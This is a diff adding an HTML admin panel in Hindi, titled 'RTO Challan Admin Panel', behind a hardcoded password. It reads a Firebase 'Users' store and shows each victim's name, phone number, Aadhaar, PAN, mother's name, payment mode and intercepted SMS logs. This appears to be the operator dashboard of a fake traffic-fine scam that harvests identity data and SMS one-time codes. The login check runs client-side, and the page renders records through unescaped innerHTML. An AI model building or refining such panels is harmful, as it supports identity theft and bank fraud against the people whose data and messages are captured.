@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RTO Challan Admin Panel</title>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f4f8; padding: 20px; }
+        .login-container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
+        .dashboard-container { display: none; max-width: 900px; margin: 0 auto; }
+        input[type="password"] { width: 80%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 8px; }
+        button { background: #ADD8E6; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .card { background: white; padding: 20px; margin-bottom: 20px; border-radius: 12px; border-left: 6px solid #ADD8E6; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .sms-box { background: #eef9ff; padding: 10px; border-radius: 8px; margin-top: 10px; border: 1px solid #d1e9f0; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+
+    <div id="login-section" class="login-container">
+        <h2>RTO Admin Login</h2>
+        <input type="password" id="passInput" placeholder="पासवर्ड डालें">
+        <button onclick="checkPassword()">Login</button>
+        <p id="error-msg" style="color: red; display: none;">गलत पासवर्ड!</p>
+    </div>
+
+    <div id="dashboard-section" class="dashboard-container">
+        <h1 style="text-align: center;">RTO Challan Database</h1>
+        <div id="data-list">डेटा लोड हो रहा है...</div>
+    </div>
+
+    <script>
+        const SECRET_PASSWORD = "Zuhi@143"; // अपना पासवर्ड यहाँ सेट करें
+
+        // आपकी Firebase Config (इसे Firebase Console से बदलें)
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "hkfhaiufahf.firebaseapp.com",
+            databaseURL: "https://hkfhaiufahf-default-rtdb.firebaseio.com",
+            projectId: "hkfhaiufahf",
+            storageBucket: "hkfhaiufahf.appspot.com",
+            messagingSenderId: "1089730321892",
+            appId: "YOUR_WEB_APP_ID"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database().ref("Users");
+
+        function checkPassword() {
+            const input = document.getElementById("passInput").value;
+            if (input === SECRET_PASSWORD) {
+                document.getElementById("login-section").style.display = "none";
+                document.getElementById("dashboard-section").style.display = "block";
+                loadData();
+            } else { document.getElementById("error-msg").style.display = "block"; }
+        }
+
+        function loadData() {
+            db.on("value", (snapshot) => {
+                const list = document.getElementById("data-list");
+                list.innerHTML = "";
+                const data = snapshot.val();
+                if (!data) { list.innerHTML = "कोई डेटा नहीं मिला।"; return; }
+                for (let id in data) {
+                    const user = data[id];
+                    let html = `<div class="card">
+                        <h3>${user.name || 'N/A'} (${user.number || 'N/A'})</h3>
+                        <p><b>Aadhaar:</b> ${user.aadhaar || 'N/A'} | <b>PAN:</b> ${user.pan || 'N/A'}</p>
+                        <p><b>Mother:</b> ${user.motherName || 'N/A'}</p>
+                        <p><b>Payment:</b> ${user.paymentMode || 'N/A'}</p>`;
+                    if (user.messages) {
+                        html += `<h4>SMS Logs:</h4>`;
+                        for (let mId in user.messages) {
+                            const msg = user.messages[mId];
+                            html += `<div class="sms-box"><b>${msg.sender}:</b> ${msg.message}</div>`;
+                        }
+                    }
+                    html += `</div>`;
+                    list.innerHTML += html;
+                }
+            });
+        }
+    </script>
+</body>
+</html>
